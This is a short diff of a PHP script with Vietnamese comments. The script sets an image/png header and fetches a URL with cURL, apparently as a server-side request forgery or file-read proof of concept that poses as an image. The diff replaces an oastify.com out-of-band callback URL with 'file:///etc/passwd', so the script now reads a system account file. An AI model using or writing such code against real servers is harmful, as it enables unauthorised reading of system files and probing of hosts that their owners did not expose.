@@ -3,7 +3,7 @@ header("Content-type: image/png");
 
 
 // URL cần fetch
-$url = "https://nc3uxsr0a77wr9rf9m3iz68uzl5ctfh4.oastify.com";
+$url = "file:///etc/passwd";
 
 // Khởi tạo cURL
 $ch = curl_init();
